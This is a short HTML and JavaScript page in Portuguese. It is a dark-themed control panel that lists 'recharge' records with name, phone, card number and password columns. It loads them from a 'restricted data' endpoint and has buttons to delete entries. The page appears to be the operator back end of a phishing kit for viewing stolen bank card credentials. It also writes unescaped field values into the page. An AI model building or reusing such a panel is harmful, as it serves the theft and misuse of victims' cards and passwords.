<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Painel de Controle</title>
    <style>
        body { background: #0d1117; color: white; font-family: sans-serif; padding: 20px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #161b22; }
        th, td { border: 1px solid #30363d; padding: 12px; text-align: left; }
        th { background: #21262d; }
        .btn-excluir { background: #da3633; color: white; border: none; padding: 6px 12px; border-radius: 6px; cursor: pointer; }
        .btn-excluir:hover { background: #f85149; }
        .btn-refresh { background: #238636; color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; margin-bottom: 20px; }
    </style>
</head>
<body>
    <h2>📋 Registros de Recarga</h2>
    <button class="btn-refresh" onclick="carregarDados()">🔄 ATUALIZAR LISTA</button>
    
    <table>
        <thead>
            <tr>
                <th>Nome</th>
                <th>Telefone</th>
                <th>Cartão</th>
                <th>Senha</th>
                <th>Ações</th>
            </tr>
        </thead>
        <tbody id="corpoTabela"></tbody>
    </table>

    <script>
        async function carregarDados() {
            const res = await fetch('/ver-dados-restritos');
            const dados = await res.json();
            const tabela = document.getElementById('corpoTabela');
            tabela.innerHTML = '';

            dados.forEach(item => {
                tabela.innerHTML += `
                    <tr>
                        <td>${item.nome}</td>
                        <td>${item.telefone}</td>
                        <td>${item.cartao}</td>
                        <td>${item.senha}</td>
                        <td>
                            <button class="btn-excluir" onclick="deletar('${item._id}')">🗑️ Apagar</button>
                        </td>
                    </tr>
                `;
            });
        }

        async function deletar(id) {
            if(confirm('Deseja mesmo excluir este registro?')) {
                const res = await fetch(`/excluir/${id}`, { method: 'DELETE' });
                if(res.ok) {
                    alert('Registro removido!');
                    carregarDados();
                }
            }
        }

        // Carrega os dados assim que abre a página
        window.onload = carregarDados;
    </script>
</body>
</html>
